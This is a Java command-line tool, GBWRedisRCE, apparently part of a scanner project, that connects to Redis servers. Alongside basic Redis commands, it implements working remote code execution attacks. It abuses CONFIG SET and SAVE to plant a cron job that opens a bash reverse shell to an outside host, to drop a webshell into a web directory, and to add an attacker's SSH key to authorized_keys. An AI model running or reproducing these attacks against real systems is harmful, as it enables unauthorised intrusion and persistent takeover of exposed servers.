package com.gbw.scanner.plugins.scripts.redis;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.GnuParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import redis.clients.jedis.Jedis;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class GBWRedisRCE {

    private static void cmdInfo(Jedis jedis){
        System.out.println(jedis.info());
    }

    private static void cmdKeys(Jedis jedis,int db){

        jedis.select(db);
        for(String s:jedis.keys("*")){

            System.out.println(s);
        }

    }

    private static void cmdSet(Jedis jedis,String args,int db){

        String[] kk = args.split(":");
        jedis.select(db);
        System.out.println(jedis.set(kk[0],kk[1]));
    }

    private static void cmdGet(Jedis jedis,String key,int db){

        jedis.select(db);
        System.out.println(jedis.get(key));
    }

    private static void cmdConfigSet(Jedis jedis,String args){

        String[] kk = args.split(":");
        String res = jedis.configSet(kk[0],kk[1]);

        System.out.println(res);
    }

    private static void cmdConfigGet(Jedis jedis,String key){

        for(String s:jedis.configGet(key))
            System.out.println(s);
    }

    private static void cmdSave(Jedis jedis){

        System.out.println(jedis.save());
    }

    private static void cmdSlaveof(Jedis jedis,String args){

        String[] kk = args.split(":");

        String host = kk[0];
        int port = Integer.parseInt(kk[1]);

        System.out.println(jedis.slaveof(host,port));
    }

    private static void cmdSlaveno(Jedis jedis){

        System.out.println(jedis.slaveofNoOne());
    }

    private static void prepare(Jedis jedis){

        jedis.configSet("stop-writes-on-bgsave-error","no");
        jedis.slaveofNoOne();
    }

    private static void printCmd(String cmd,String res){

        System.out.println(String.format("cmd:%s,result:%s",cmd,res));
    }

    private static void runShellAttack(Jedis jedis,String args){

        String[] kk = args.split(":");

        String host = kk[0];
        int port = Integer.parseInt(kk[1]);

        String shell = String.format("\n* * * * * bash -i >& /dev/tcp/%s/%d 0>&1\n",host,port);
        prepare(jedis);

        /*try to write /var/spool/cron*/
        try {
            printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"));
            printCmd("set x "+shell,jedis.set("x",shell));
            printCmd("config set dbfilename root",jedis.configSet("dbfilename","root"));
            String res = jedis.save();
            printCmd("save",res);
            return;
        }catch (Exception e){

        }

        /*try to write redis*/
        try {
            printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"));
            printCmd("set x "+shell,jedis.set("x",shell));
            printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"));
            String res = jedis.save();
            printCmd("save",res);
            return;
        }catch (Exception e){

        }
        
        /*try to write to /etc/cron.d/redis*/
        printCmd("config set dir /etc/cron.d",jedis.configSet("dir","/etc/cron.d"));
        printCmd("set x "+shell,jedis.set("x",shell));
        printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"));
        printCmd("save",jedis.save());
    }

    private static void runWebshellAttack(Jedis jedis,String args) throws Exception {

        String[] kk = args.split(":");

        String dir = kk[0];
        String fpath = kk[1];

        Path path = Paths.get(fpath);
        String fname = path.getFileName().toString();

        String content = new String(Files.readAllBytes(path));
        prepare(jedis);
        printCmd("config set dir "+dir,jedis.configSet("dir",dir));
        printCmd("set x "+content,jedis.set("x",content));
        printCmd("config set dbfilename "+fname,jedis.configSet("dbfilename",fname));
        printCmd("save",jedis.save());

    }


    private static void runSSHAttack(Jedis jedis,String args) throws IOException {

        String[] kk = args.split(":");

        String user = kk[0];
        String key = kk[1];

        String content = new String(Files.readAllBytes(Paths.get(key)));

        String authPath = String.format("%s/.ssh/",user);
        String auth = "authorized_keys";


        prepare(jedis);
        printCmd("config set dir "+authPath,jedis.configSet("dir",authPath));
        printCmd("set x "+content,jedis.set("x",content));
        printCmd("config set dbfilename "+auth,jedis.configSet("dbfilename",auth));
        printCmd("save",jedis.save());

    }

    public static void main(String[] args) throws Exception {

        Jedis jedis;
        String host= "127.0.0.1";
        int port = 6379;
        int timeout = 10000;
        int db = 0;

        Options opts = new Options();
        opts.addOption("host",true,"redis host");
        opts.addOption("port",true,"redis port");
        opts.addOption("db",true,"redis database index");

        opts.addOption("info",false,"redis info cmd");
        opts.addOption("keys",false,"redis keys cmd");
        opts.addOption("save",false,"redis save cmd");
        opts.addOption("slaveno",false,"redis slave no one cmd");

        opts.addOption("set",true,"redis set cmd:<key>:<value>");
        opts.addOption("get",true,"redis get cmd:<key>");
        opts.addOption("slaveof",true,"redis slave of cmd:<host>:<port>");
        opts.addOption("configSet",true,"configSet cmd:<key>:<value>");
        opts.addOption("configGet",true,"configGet cmd:<key>");

        opts.addOption("shell",true,"get-shell remote host and port: <host>:<port>");
        opts.addOption("webshell",true,"write webshell attack: <web_dir>:<webshell file path>");
        opts.addOption("ssh",true,"write public key and remote login:<user>:<key_path>");

        opts.addOption("timeout",true,"connect/read timeout");
        opts.addOption("help", false, "Print usage");

        CommandLine cliParser = new GnuParser().parse(opts, args);
        if(cliParser.hasOption("help")){

            new HelpFormatter().printHelp("GBWRedisRCE", opts);
            System.exit(0);
        }

        if(cliParser.hasOption("host"))
            host = cliParser.getOptionValue("host");

        if(cliParser.hasOption("port"))
            port = Integer.parseInt(cliParser.getOptionValue("port"));

        if(cliParser.hasOption("timeout"))
            timeout = Integer.parseInt(cliParser.getOptionValue("timeout"));

        jedis = new Jedis(host,port,timeout);
        if(cliParser.hasOption("db"))
            db = Integer.parseInt(cliParser.getOptionValue("db"));

        if(cliParser.hasOption("info")){

            cmdInfo(jedis);
        }

        if(cliParser.hasOption("keys"))
        {
            cmdKeys(jedis,db);
        }

        if(cliParser.hasOption("save")){
            cmdSave(jedis);
        }

        if(cliParser.hasOption("slaveno")){

            cmdSlaveno(jedis);
        }

        if(cliParser.hasOption("set")){

            cmdSet(jedis,cliParser.getOptionValue("set"),db);
        }

        if(cliParser.hasOption("get")){

            cmdGet(jedis,cliParser.getOptionValue("get"),db);
        }

        if(cliParser.hasOption("slaveof")){

            cmdSlaveof(jedis,cliParser.getOptionValue("slaveof"));
        }

        if(cliParser.hasOption("configSet"))
            cmdConfigSet(jedis,cliParser.getOptionValue("configSet"));

        if(cliParser.hasOption("configGet"))
            cmdConfigGet(jedis,cliParser.getOptionValue("configGet"));

        if(cliParser.hasOption("shell")){

            runShellAttack(jedis,cliParser.getOptionValue("shell"));
        }

        if(cliParser.hasOption("webshell")){

            runWebshellAttack(jedis,cliParser.getOptionValue("webshell"));
        }

        if(cliParser.hasOption("ssh")){

            runSSHAttack(jedis,cliParser.getOptionValue("ssh"));
        }

    }

}
